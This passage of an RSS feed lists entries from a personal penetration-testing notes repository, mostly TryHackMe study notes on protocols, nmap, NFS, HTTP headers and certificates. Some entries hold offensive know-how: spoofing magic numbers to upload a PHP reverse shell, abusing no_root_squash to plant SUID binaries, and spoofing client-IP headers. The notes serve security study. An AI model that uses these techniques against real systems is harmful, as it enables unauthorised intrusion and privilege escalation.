			<pubDate>Thu, 13 Apr 2023 00:34:31 +0000</pubDate>
			<guid>https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/How%20to%20Add%20Windows%20Users%20%28at%20the%20Command%20Line%29.md</guid>
		</item>
		<item>
			<title>How to Identify Windows Shares With Nmap</title>
			<link>https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/How%20to%20Identify%20Windows%20Shares%20With%20Nmap.md</link>
			<description>&lt;p&gt;Typical NMAP portscan output for SMB:&lt;/p&gt;&lt;pre&gt;&lt;code&gt;PORT    STATE SERVICE      REASON
139/tcp open  netbios-ssn  syn-ack
445/tcp open  microsoft-ds syn-ack
&lt;/code&gt;&lt;/pre&gt;</description>
			<pubDate>Thu, 13 Apr 2023 00:34:31 +0000</pubDate>
			<guid>https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/How%20to%20Identify%20Windows%20Shares%20With%20Nmap.md</guid>
		</item>
		<item>
			<title>How to Quickly Bypass "ssh-agent"</title>
			<link>https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/How%20to%20Quickly%20Bypass%20%22ssh-agent%22.md</link>
			<description>&lt;div class=&quot;sourceCode&quot; id=&quot;cb1&quot;&gt;&lt;pre class=&quot;sourceCode bash&quot;&gt;&lt;code class=&quot;sourceCode bash&quot;&gt;&lt;span id=&quot;cb1-1&quot;&gt;&lt;a href=&quot;#cb1-1&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;fu&quot;&gt;env&lt;/span&gt; -u SSH_AUTH_SOCK ssh -i &lt;span class=&quot;va&quot;&gt;$KEY_FILE&lt;/span&gt; &lt;span class=&quot;va&quot;&gt;${USER}&lt;/span&gt;@&lt;span class=&quot;va&quot;&gt;${HOST}&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;https://github.com/slyth11907/Cheatsheets&quot;&gt;slyth11907 / Cheatsheets&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;</description>
			<pubDate>Thu, 13 Apr 2023 00:34:31 +0000</pubDate>
			<guid>https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/How%20to%20Quickly%20Bypass%20%22ssh-agent%22.md</guid>
		</item>
		<item>
			<title>How to Set PATH in a Session</title>
			<link>https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/How%20to%20Set%20PATH%20in%20a%20Session.md</link>
			<description>&lt;p&gt;Update the current PATH in Windows:&lt;/p&gt;&lt;div class=&quot;sourceCode&quot; id=&quot;cb1&quot;&gt;&lt;pre class=&quot;sourceCode powershell&quot;&gt;&lt;code class=&quot;sourceCode powershell&quot;&gt;&lt;span id=&quot;cb1-1&quot;&gt;&lt;a href=&quot;#cb1-1&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;fu&quot;&gt;set&lt;/span&gt; PATH=%PATH%;C:\Some\Other\Directory&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Update the current PATH in Linux:&lt;/p&gt;&lt;div class=&quot;sourceCode&quot; id=&quot;cb2&quot;&gt;&lt;pre class=&quot;sourceCode bash&quot;&gt;&lt;code class=&quot;sourceCode bash&quot;&gt;&lt;span id=&quot;cb2-1&quot;&gt;&lt;a href=&quot;#cb2-1&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;bu&quot;&gt;export&lt;/span&gt; &lt;span class=&quot;va&quot;&gt;PATH=$PATH&lt;/span&gt;:/some/other/directory&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&quot;references&quot;&gt;References&lt;/h2&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;https://www.youtube.com/watch?v=Zma6Mk5bEI8&quot;&gt;Alice with Siddicky (Student Mentor) (YouTube)&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;</description>
			<pubDate>Thu, 13 Apr 2023 00:34:31 +0000</pubDate>
			<guid>https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/How%20to%20Set%20PATH%20in%20a%20Session.md</guid>
		</item>
		<item>
			<title>Hypertext Transfer Protocol (HTTP)</title>
			<link>https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/Hypertext%20Transfer%20Protocol%20%28HTTP%29.md</link>
			<description>&lt;h2 id=&quot;a-minimal-http-request&quot;&gt;A Minimal HTTP Request&lt;/h2&gt;&lt;pre class=&quot;http&quot;&gt;&lt;code&gt;GET / HTTP/1.1
host: something

&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;(Note the blank line at the end.)&lt;/p&gt;&lt;h2 id=&quot;useful-http-headers&quot;&gt;Useful HTTP Headers&lt;/h2&gt;&lt;ul&gt;&lt;li&gt;Server - Web server information (Apache, NGINX, etc.); useful for recon.&lt;/li&gt;&lt;li&gt;True-Client-IP - Override the client IP address (direct connections to servers).&lt;/li&gt;&lt;li&gt;X-Forwarded-For - Override the client IP address (connections forwarded through proxies).&lt;/li&gt;&lt;li&gt;X-Powered-By - Added by some application engines to advertise themselves; useful for recon.&lt;/li&gt;&lt;li&gt;Content-Type - Specifies the body content; normally only set by the client for POST/PATCH requests (for example, form data uses application/x-www-form-urlencoded.&lt;/li&gt;&lt;li&gt;Content-Length - The length of the body in bytes (which is just characters for ASCII) for POST requests.&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;There are other headers (for example, Cookie), and arbitrary additional X-prefixed (non-standard) headers can also be added.&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;https://developer.mozilla.org/docs/Web/HTTP/Headers/Content-Length&quot;&gt;Content-Length (MDN)&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;</description>
			<pubDate>Thu, 13 Apr 2023 00:34:31 +0000</pubDate>
			<guid>https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/Hypertext%20Transfer%20Protocol%20%28HTTP%29.md</guid>
		</item>
		<item>
			<title>ICMP Protocol</title>
			<link>https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/ICMP%20Protocol.md</link>
			<description>&lt;p&gt;ICMP headers are 8 bytes; the first 4 bytes have a fixed meaning, while the meaning of the last 4 bytes varies depending on the type of request specified in the first 4 bytes.&lt;/p&gt;&lt;p&gt;ICMP traffic &quot;types&quot; correspond to the kind of packet being sent (though different ICMP services can have multiple types):&lt;/p&gt;&lt;ul&gt;&lt;li&gt;0 â Ping reply&lt;/li&gt;&lt;li&gt;8 â Ping request&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;Ping packets typically just include either random data or all zeros.&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;https://tryhackme.com/room/wireshark&quot;&gt;TryHackMe: Wireshark 101&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://datatracker.ietf.org/doc/html/rfc792&quot;&gt;RFC 792&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://en.wikipedia.org/wiki/Internet_Control_Message_Protocol&quot;&gt;Internet Control Message Protocol (Wikipedia)&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://tryhackme.com/path/outline/jrpenetrationtester&quot;&gt;TryHackMe: Jr. Penetration Tester&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;</description>
			<pubDate>Thu, 13 Apr 2023 00:34:31 +0000</pubDate>
			<guid>https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/ICMP%20Protocol.md</guid>
		</item>
		<item>
			<title>Internet Message Access Protocol (IMAP)</title>
			<link>https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/Internet%20Message%20Access%20Protocol%20%28IMAP%29.md</link>
			<description>&lt;p&gt;IMAP commands are much more complicated than POP3. Some examples:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;Login User - prefix LOGIN user pass&lt;/li&gt;&lt;li&gt;Lost Folders - prefix LIST &quot;&quot; &quot;*&quot;&lt;/li&gt;&lt;li&gt;List Emails in INBOX - prefix EXAMINE INBOX&lt;/li&gt;&lt;li&gt;Close Connection - prefix LOGOUT&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;Here &lt;code&gt;prefix&lt;/code&gt; is a random prefix we provide to track server replies to various commands. IMAP accepts a lot of different user authentication methods; LOGIN is just the simplest (and least secure).&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;https://tryhackme.com/path/outline/jrpenetrationtester&quot;&gt;TryHackMe: Jr. Penetration Tester&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;</description>
			<pubDate>Thu, 13 Apr 2023 00:34:31 +0000</pubDate>
			<guid>https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/Internet%20Message%20Access%20Protocol%20%28IMAP%29.md</guid>
		</item>
		<item>
			<title>Linux Process Signals</title>
			<link>https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/Linux%20Process%20Signals.md</link>
			<description>&lt;h2 id=&quot;important-signals&quot;&gt;Important Signals&lt;/h2&gt;&lt;ul&gt;&lt;li&gt;SIGTERM - Kill the process, but allow it to do some cleanup tasks beforehand&lt;/li&gt;&lt;li&gt;SIGKILL - Kill the process - doesn't do any cleanup after the fact&lt;/li&gt;&lt;li&gt;SIGSTOP - Stop/suspend a process&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;There are others, but these are the big ones.&lt;/p&gt;&lt;h2 id=&quot;references&quot;&gt;References&lt;/h2&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;https://tryhackme.com/path/outline/presecurity&quot;&gt;TryHackMe: Pre Security&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;</description>
			<pubDate>Thu, 13 Apr 2023 00:34:31 +0000</pubDate>
			<guid>https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/Linux%20Process%20Signals.md</guid>
		</item>
		<item>
			<title>Look Up Unicode and Emoji Symbols</title>
			<link>https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/Look%20Up%20Unicode%20and%20Emoji%20Symbols.md</link>
			<description>&lt;h2 id=&quot;general-references&quot;&gt;General References&lt;/h2&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;https://emojipedia.org&quot;&gt;Emojipedia&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://unicode-table.com&quot;&gt;Unicode Character Table&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;h2 id=&quot;specific-tables&quot;&gt;Specific Tables&lt;/h2&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;https://unicode-table.com/sets/arrow-symbols/&quot;&gt;Unicode Arrows&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://unicode-table.com/sets/superscript-and-subscript-numbers/&quot;&gt;Unicode Superscripts and Subscripts&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;</description>
			<pubDate>Thu, 13 Apr 2023 00:34:31 +0000</pubDate>
			<guid>https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/Look%20Up%20Unicode%20and%20Emoji%20Symbols.md</guid>
		</item>
		<item>
			<title>MAC Addresses</title>
			<link>https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/MAC%20Addresses.md</link>
			<description>&lt;p&gt;MAC (âMedia Access Controlâ) are unique 48-bit identifying numbers burned into network cards. They are typically represented as six octets each composed of two hexadecimal numbers (0 - f). The first three octets designate the network interface vendor while the last three constitute device serial number. On most operating systems octets are separated using colons, but Windows uses dashes instead.&lt;/p&gt;&lt;ul&gt;&lt;li&gt;UNIX-style MAC address â a4:c3:f0:85:ac:2d&lt;/li&gt;&lt;li&gt;Vendor ID â a4:c3:f0&lt;/li&gt;&lt;li&gt;NIC ID â 85:ac:2d&lt;/li&gt;&lt;li&gt;Windows version of the same MAC address â A4-C3-F0-85-AC-2D&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;Some network cards and operating systems allow MAC addresses to be overridden (for example, this is used for Wi-Fi privacy, and can be done explicitly on UNIX systems using the macchanger tool).&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;https://tryhackme.com/path/outline/presecurity&quot;&gt;TryHackMe: Pre Security&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;</description>
			<pubDate>Thu, 13 Apr 2023 00:34:31 +0000</pubDate>
			<guid>https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/MAC%20Addresses.md</guid>
		</item>
		<item>
			<title>MITRE ATT&CK Emulation Plans</title>
			<link>https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/MITRE%20ATT%26CK%20Emulation%20Plans.md</link>
			<description>&lt;p&gt;These are a little hard to find.&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;https://attack.mitre.org/resources/adversary-emulation-plans/&quot;&gt;APT3&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://github.com/center-for-threat-informed-defense/adversary_emulation_library/tree/master/fin6&quot;&gt;FIN6&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://github.com/center-for-threat-informed-defense/adversary_emulation_library/tree/master/apt29&quot;&gt;APT29&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://github.com/center-for-threat-informed-defense/adversary_emulation_library/blob/master/menuPass&quot;&gt;menuPass&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://github.com/center-for-threat-informed-defense/adversary_emulation_library/blob/master/carbanak&quot;&gt;Carbanak Group&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://github.com/center-for-threat-informed-defense/adversary_emulation_library/tree/master/fin7&quot;&gt;FIN7&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;h2 id=&quot;resources&quot;&gt;Resources&lt;/h2&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;https://tryhackme.com/room/mitre&quot;&gt;TryHackMe: MITRE&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;</description>
			<pubDate>Thu, 13 Apr 2023 00:34:31 +0000</pubDate>
			<guid>https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/MITRE%20ATT%26CK%20Emulation%20Plans.md</guid>
		</item>
		<item>
			<title>Magic Numbers</title>
			<link>https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/Magic%20Numbers.md</link>
			<description>&lt;p&gt;Magic numbers comprise the first few bytes of a file (often, but not always, the first 4 bytes). Text files don't have magic number, so one trick you can do is just insert four ASCII characters in the front of your file and then use a hex editor to change them to an appropriate magic number.&lt;/p&gt;&lt;p&gt;The &lt;code&gt;hexeditor&lt;/code&gt; app is a quick-and-easy hex editor, and &lt;code&gt;file&lt;/code&gt; can give you a sense of whether you've effectively spoofed a file's magic number.&lt;/p&gt;&lt;p&gt;Note that this can be a lot trickier if you're not dealing with PHP, since many languages don't have PHP's concept of interpreted vs. non-interpreted bits. In these cases, you'll need to intercept the upload request and remove the extra bytes, less you end up with an unexecutable reverse shell!&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;https://tryhackme.com/path/outline/beginner&quot;&gt;TryHackMe: Complete Beginner&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://en.wikipedia.org/wiki/List_of_file_signatures&quot;&gt;List of file signatures&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;</description>
			<pubDate>Thu, 13 Apr 2023 00:34:31 +0000</pubDate>
			<guid>https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/Magic%20Numbers.md</guid>
		</item>
		<item>
			<title>Using NFS</title>
			<link>https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/Using%20NFS.md</link>
			<description>&lt;h2 id=&quot;nfs-basics&quot;&gt;NFS Basics&lt;/h2&gt;&lt;p&gt;All versions of NFS use port 2049 to transfer data; NFSv1 - NFSv3 also depended on the &quot;portmapper&quot; service running on port 111, but this requirement was removed in NFSv4.&lt;/p&gt;&lt;div class=&quot;sourceCode&quot; id=&quot;cb1&quot;&gt;&lt;pre class=&quot;sourceCode bash&quot;&gt;&lt;code class=&quot;sourceCode bash&quot;&gt;&lt;span id=&quot;cb1-1&quot;&gt;&lt;a href=&quot;#cb1-1&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;# List NFS shares.&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-2&quot;&gt;&lt;a href=&quot;#cb1-2&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;#&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-3&quot;&gt;&lt;a href=&quot;#cb1-3&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;ex&quot;&gt;showmount&lt;/span&gt; -e &lt;span class=&quot;va&quot;&gt;$SERVER_IP&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-4&quot;&gt;&lt;a href=&quot;#cb1-4&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-5&quot;&gt;&lt;a href=&quot;#cb1-5&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;# Mount an NFS share.&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-6&quot;&gt;&lt;a href=&quot;#cb1-6&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;#&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-7&quot;&gt;&lt;a href=&quot;#cb1-7&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;fu&quot;&gt;sudo&lt;/span&gt; mount -t nfs &lt;span class=&quot;va&quot;&gt;${SERVER_IP}&lt;/span&gt;:&lt;span class=&quot;va&quot;&gt;${SHARE_PATH}&lt;/span&gt; &lt;span class=&quot;kw&quot;&gt;\&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-8&quot;&gt;&lt;a href=&quot;#cb1-8&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;                  &lt;span class=&quot;va&quot;&gt;$LOCAL_MOUNT_DIR&lt;/span&gt; &lt;span class=&quot;ex&quot;&gt;-nolock&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-9&quot;&gt;&lt;a href=&quot;#cb1-9&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-10&quot;&gt;&lt;a href=&quot;#cb1-10&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;# Force-unmount an unresponsive share.&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-11&quot;&gt;&lt;a href=&quot;#cb1-11&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;#&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-12&quot;&gt;&lt;a href=&quot;#cb1-12&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;fu&quot;&gt;sudo&lt;/span&gt; umount -f &lt;span class=&quot;va&quot;&gt;$LOCAL_MOUNT_DIR&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Note that the mount directory must be owned by root.&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;https://racinpaper.com/auto-racing/what-is-nfs-port-number-in-linux.html&quot;&gt;What is NFS port number in Linux?&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;h2 id=&quot;root-squashing&quot;&gt;Root Squashing&lt;/h2&gt;&lt;p&gt;Files created on NFS shares inherit the &lt;em&gt;remote&lt;/em&gt; UID. By default, NFS enables &quot;root squashing&quot;, which maps UID 0 to the &lt;code&gt;nobody&lt;/code&gt; user.&lt;/p&gt;&lt;p&gt;Root squashing can be &lt;em&gt;disabled&lt;/em&gt; in /etc/exports with the &lt;code&gt;no_root_squash&lt;/code&gt; flag. This is obviously insecure, however, as it allows a user that connects to that share as root to drop SUID binaries! (Remember that files on NFS mounts are created using the UID/GID values of the &lt;em&gt;local&lt;/em&gt; user!)&lt;/p&gt;</description>
			<pubDate>Thu, 13 Apr 2023 00:34:31 +0000</pubDate>
			<guid>https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/Using%20NFS.md</guid>
		</item>
		<item>
			<title>iOS Shortcuts Quirks</title>
			<link>https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/iOS%20Shortcuts%20Quirks.md</link>
			<description>&lt;h2 id=&quot;add-to-variable-vs-set-to-variable&quot;&gt;âAdd to variableâ vs. âSet to Variableâ&lt;/h2&gt;&lt;p&gt;In my experience, the &quot;Add to variable&quot; action is unreliable for appending text to strings; it seems to work to &lt;em&gt;create&lt;/em&gt; a variable, but not actually for appends. However, &quot;Set to variable&quot; seems to be reliable, so a work-around is to set a whole bunch of variables and then use a &quot;Text&quot; action at the end of the workflow to assemble them as desired.&lt;/p&gt;&lt;h2 id=&quot;get-shortcuts-to-show-up-in-the-ios-share-sheet-after-reinstallation&quot;&gt;Get Shortcuts to Show Up in the iOS Share Sheet After Reinstallation&lt;/h2&gt;&lt;p&gt;For whatever reason, shortcuts created in the iOS Shortcuts app wonât show up in appsâ share sheets if youâve uninstalled Shortcuts and then reinstall it. To solve this, simply reboot the device and then open up the Shortcuts app (no need to run anything, just open it once).&lt;/p&gt;</description>
			<pubDate>Thu, 13 Apr 2023 00:34:31 +0000</pubDate>
			<guid>https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/iOS%20Shortcuts%20Quirks.md</guid>
		</item>
		<item>
			<title>OneDrive Quirks</title>
			<link>https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/OneDrive%20Quirks.md</link>
			<description>&lt;p&gt;On iOS, OneDrive files cannot be accessed through the Files app if a passcode is enabled.&lt;/p&gt;&lt;p&gt;On iOS, &lt;em&gt;explicitly&lt;/em&gt; downloading an image or video in OneDrive will automatically add it to your iCloud Photo Library. (It doesn't &lt;em&gt;appear&lt;/em&gt; that this happens to images and videos in a folder set for offline use, but I'm not 100% sure about this.)&lt;/p&gt;</description>
			<pubDate>Thu, 13 Apr 2023 03:55:00 +0000</pubDate>
			<guid>https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/OneDrive%20Quirks.md</guid>
		</item>
		<item>
			<title>Packet Headers</title>
			<link>https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/Packet%20Headers.md</link>
			<description>&lt;h2 id=&quot;importantcommon-tcp-packet-headers&quot;&gt;Important/Common TCP Packet Headers&lt;/h2&gt;&lt;ul&gt;&lt;li&gt;Time to Live (TTL) - How long a packet should live on the network before being discarded.&lt;/li&gt;&lt;li&gt;Source port - A random (unused) port chosen by the sender.&lt;/li&gt;&lt;li&gt;Destination port - The port on the receiving end, which normally is determined by the application being used.&lt;/li&gt;&lt;li&gt;Source address - &quot;From&quot; IP address.&lt;/li&gt;&lt;li&gt;Destination address - &quot;To&quot; IP address.&lt;/li&gt;&lt;li&gt;Sequence number - A random number that identifies a given connection.&lt;/li&gt;&lt;li&gt;Acknowledgement number - Starts at the sequence number and then increases by the number of bytes received in the previous packet (or 1 is the previous packet did not include a data segment). Used to ensure that no data is lost, and that packets are reassembled in the right order.&lt;/li&gt;&lt;li&gt;Checksum - Integrity check.&lt;/li&gt;&lt;li&gt;Data - The, well, data.&lt;/li&gt;&lt;li&gt;Flag(s) - How the packet should be handled (SYN, ACK, FIN, RST, etc.).&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;There's potentially &lt;em&gt;a lot&lt;/em&gt; more detail then this in a TCP packet header, however.&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;https://defcon.org/html/defcon-30/dc-30-index.html&quot;&gt;DEF CON 30&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;h2 id=&quot;importantcommon-udp-packet-headers&quot;&gt;Important/Common UDP Packet Headers&lt;/h2&gt;&lt;ul&gt;&lt;li&gt;Time to Live (TTL) - How long a packet should live on the network before being discarded.&lt;/li&gt;&lt;li&gt;Source port - A random (unused) port chosen by the sender.&lt;/li&gt;&lt;li&gt;Destination port - The port on the receiving end, which normally is determined by the application being used.&lt;/li&gt;&lt;li&gt;Source address - &quot;From&quot; IP address.&lt;/li&gt;&lt;li&gt;Destination address - &quot;To&quot; IP address.&lt;/li&gt;&lt;li&gt;Data - The, well, data.&lt;/li&gt;&lt;/ul&gt;</description>
			<pubDate>Thu, 13 Apr 2023 03:55:00 +0000</pubDate>
			<guid>https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/Packet%20Headers.md</guid>
		</item>
		<item>
			<title>Post Office Protocol 3 (POP3)</title>
			<link>https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/Post%20Office%20Protocol%203%20%28POP3%29.md</link>
			<description>&lt;p&gt;POP3 commands:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;USER - Username to use for authentication&lt;/li&gt;&lt;li&gt;PASS - Password to use for authentication&lt;/li&gt;&lt;li&gt;STAT - Mailbox statistics (+OK $TOTAL_MSGS $MBOX_SIZE_BYTES)&lt;/li&gt;&lt;li&gt;LIST - List messages ($MSG_NUMBER $MSG_SIZE_BYTES)&lt;/li&gt;&lt;li&gt;RETR - Retrieve message $MESSAGE_NUMBER&lt;/li&gt;&lt;li&gt;QUIT - Close connection&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;There are other commands, but the above are enough to pull messages.&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;https://tryhackme.com/path/outline/jrpenetrationtester&quot;&gt;TryHackMe: Jr. Penetration Tester&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;</description>
			<pubDate>Thu, 13 Apr 2023 03:55:00 +0000</pubDate>
			<guid>https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/Post%20Office%20Protocol%203%20%28POP3%29.md</guid>
		</item>
		<item>
			<title>Pull SSL Certificates from an External Server</title>
			<link>https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/Pull%20SSL%20Certificates%20from%20an%20External%20Server.md</link>
			<description>&lt;div class=&quot;sourceCode&quot; id=&quot;cb1&quot;&gt;&lt;pre class=&quot;sourceCode bash&quot;&gt;&lt;code class=&quot;sourceCode bash&quot;&gt;&lt;span id=&quot;cb1-1&quot;&gt;&lt;a href=&quot;#cb1-1&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;# Pull a server&amp;#39;s certificate:&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-2&quot;&gt;&lt;a href=&quot;#cb1-2&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;#&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-3&quot;&gt;&lt;a href=&quot;#cb1-3&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;ex&quot;&gt;openssl&lt;/span&gt; s_client -connect &lt;span class=&quot;va&quot;&gt;${SERVER}&lt;/span&gt;:&lt;span class=&quot;va&quot;&gt;${PORT}&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-4&quot;&gt;&lt;a href=&quot;#cb1-4&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-5&quot;&gt;&lt;a href=&quot;#cb1-5&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;# When dealing with a mail server using STARTTLS, we need&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-6&quot;&gt;&lt;a href=&quot;#cb1-6&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;# to modify this a bit:&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-7&quot;&gt;&lt;a href=&quot;#cb1-7&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;#&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-8&quot;&gt;&lt;a href=&quot;#cb1-8&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;ex&quot;&gt;openssl&lt;/span&gt; s_client -connect &lt;span class=&quot;va&quot;&gt;${SERVER}&lt;/span&gt;:&lt;span class=&quot;va&quot;&gt;${PORT}&lt;/span&gt; &lt;span class=&quot;kw&quot;&gt;\&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-9&quot;&gt;&lt;a href=&quot;#cb1-9&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;                 &lt;span class=&quot;ex&quot;&gt;-starttls&lt;/span&gt; smtp&lt;/span&gt;
&lt;span id=&quot;cb1-10&quot;&gt;&lt;a href=&quot;#cb1-10&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-11&quot;&gt;&lt;a href=&quot;#cb1-11&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;# Pull the entire certificate chain:&lt;/span&gt;&lt;/span&gt;
